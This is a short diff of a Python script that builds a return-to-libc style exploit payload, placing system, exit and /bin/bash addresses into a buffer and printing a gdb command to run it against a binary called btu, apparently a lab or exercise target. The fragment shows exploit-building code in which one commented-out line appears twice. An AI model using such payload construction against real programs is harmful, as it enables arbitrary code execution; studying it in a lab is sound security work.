@@ -32,9 +32,10 @@ content[12:16] = (bin_bash).to_bytes(4, byteorder='little')
 
 
 # Print the final payload in escaped format for gdb --args
-escaped = ''.join('\\x{:02x}'.format(b) for b in content)
+# escaped = ''.join('\\x{:02x}'.format(b) for b in content)
+# escaped = ''.join('\\x{:02x}'.format(b) for b in content)
 
 
 
-print(f'gdb --args ./build/bin/btu add $(echo -e "{escaped}")')
+print(f'gdb --args ./build/bin/btu add {base_pointer_address} {system_addr} {exit_addr} {bin_bash}')
 
